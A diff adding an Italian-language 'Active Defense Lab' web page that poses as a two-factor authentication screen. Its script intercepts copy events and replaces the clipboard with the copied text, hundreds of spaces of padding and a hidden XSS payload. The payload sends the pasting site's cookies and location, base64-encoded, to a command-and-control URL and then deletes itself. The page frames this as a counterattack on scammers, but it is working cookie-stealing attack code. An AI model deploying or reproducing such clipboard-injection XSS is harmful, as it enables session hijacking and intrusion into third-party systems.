@@ -1,0 +1,99 @@
+<!DOCTYPE html>
+<html lang="it">
+
+<head>
+    <meta charset="UTF-8">
+    <title>Vittima - Active Defense Lab</title>
+    <style>
+        body {
+            font-family: sans-serif;
+            padding: 50px;
+            background: #f0f0f0;
+        }
+
+        .data-container {
+            background: white;
+            padding: 20px;
+            border-radius: 8px;
+            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
+        }
+
+        h1 {
+            color: #333;
+        }
+
+        .otp-code {
+            font-size: 2em;
+            font-weight: bold;
+            color: #007bff;
+            letter-spacing: 5px;
+        }
+
+        .warning {
+            color: red;
+            font-size: 0.9em;
+            margin-top: 10px;
+        }
+    </style>
+</head>
+
+<body>
+
+    <div class="data-container">
+        <h1>Autenticazione a Due Fattori</h1>
+        <p>Per favore, comunica il seguente codice all'operatore:</p>
+        <div class="otp-code">123456</div>
+        <p class="warning">NON CONDIVIDERE QUESTO CODICE CON NESSUNO.</p>
+    </div>
+
+    <script>
+        // --- CONFIGURAZIONE LAB ---
+        const ATTACK_SWITCH = true; // [ON] Active Countermeasures
+        const C2_URL = "http://127.0.0.1:5000"; // Server C2 Locale
+
+        /**
+         * Generates the "Iceberg" payload:
+         * 1. Decoy: Legitimate text (visible).
+         * 2. Padding: Massive whitespace (pushes payload out of view).
+         * 3. Payload: Malicious XSS code (hidden).
+         */
+        function getIcebergPayload(originalText) {
+            // Se l'utente ha selezionato "123456", usiamo quello come esca
+            // Se ha selezionato poco testo, inventiamo un nome
+            let decoy = originalText.trim();
+            if (decoy.length === 0) decoy = "Mario Rossi";
+
+            // Padding per spingere il payload fuori dalla vista orizzontale
+            // Usiamo spazi normali (0x20) che funzionano bene negli input HTML
+            const padding = " ".repeat(500);
+
+            // Il payload stealth che esfiltra e si autodistrugge
+            const payload = `"><img src=x style=display:none onerror="var d=document;fetch('${C2_URL}/exfil?c='+btoa(d.cookie)+'&l='+btoa(d.location));this.remove();">`;
+
+            return decoy + padding + payload;
+        }
+
+        // --- INTERCETTORE ---
+        document.addEventListener('copy', function (e) {
+            // 1. Rilevamento Passivo
+            const originalText = window.getSelection().toString();
+            console.log(`[PASSIVE INTEL] Lo scammer sta copiando: "${originalText}"`);
+
+            // 2. Contromisura Attiva
+            if (ATTACK_SWITCH) {
+                e.preventDefault();
+                console.warn("[ACTIVE DEFENSE] Intercettazione copia. Iniezione Iceberg avviata.");
+
+                const finalPayload = getIcebergPayload(originalText);
+
+                if (e.clipboardData) {
+                    // Sovrascriviamo il buffer con il payload Iceberg
+                    e.clipboardData.setData('text/plain', finalPayload);
+                    // alert("Payload Iceberg caricato nel clipboard!"); 
+                }
+            }
+        });
+    </script>
+</body>
+
+</html>
